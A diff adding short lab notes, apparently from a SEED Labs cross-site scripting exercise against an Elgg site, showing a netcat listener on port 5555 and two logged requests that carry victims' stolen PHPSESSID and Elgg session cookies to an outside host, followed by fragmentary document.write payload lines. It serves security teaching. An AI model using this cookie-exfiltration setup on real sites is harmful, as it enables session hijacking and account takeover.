@@ -1,0 +1,34 @@
+- porta in ascolto 
+nc -lknv 5555
+
+unina@software-security:~$ nc -lknv 5555
+Listening on 0.0.0.0 5555
+Connection received on 192.168.64.128 60418
+GET /?c=PHPSESSID%3D0ajaq4d13eis42jjpduqa16dq6%3B%20Elgg%3Dmn75jcrssvi99j7i9b89hhe394 HTTP/1.1
+Host: 10.9.0.1:5555
+User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:135.0) Gecko/20100101 Firefox/135.0
+Accept: image/avif,image/webp,image/png,image/svg+xml,image/*;q=0.8,*/*;q=0.5
+Accept-Language: it-IT,it;q=0.8,en-US;q=0.5,en;q=0.3
+Accept-Encoding: gzip, deflate
+DNT: 1
+Sec-GPC: 1
+Connection: keep-alive
+Referer: http://www.seed-server.com/
+Priority: u=5, i
+
+Connection received on 192.168.64.128 42910
+GET /?c=PHPSESSID%3D0ajaq4d13eis42jjpduqa16dq6%3B%20Elgg%3Db8i664hq8focbkhfjhhapf8hfl HTTP/1.1
+Host: 10.9.0.1:5555
+User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:135.0) Gecko/20100101 Firefox/135.0
+Accept: image/avif,image/webp,image/png,image/svg+xml,image/*;q=0.8,*/*;q=0.5
+Accept-Language: it-IT,it;q=0.8,en-US;q=0.5,en;q=0.3
+Accept-Encoding: gzip, deflate
+DNT: 1
+Sec-GPC: 1
+
+
+
+document.write(guid);
+document.write(ts);
+document.write(token);
+document.write(name);
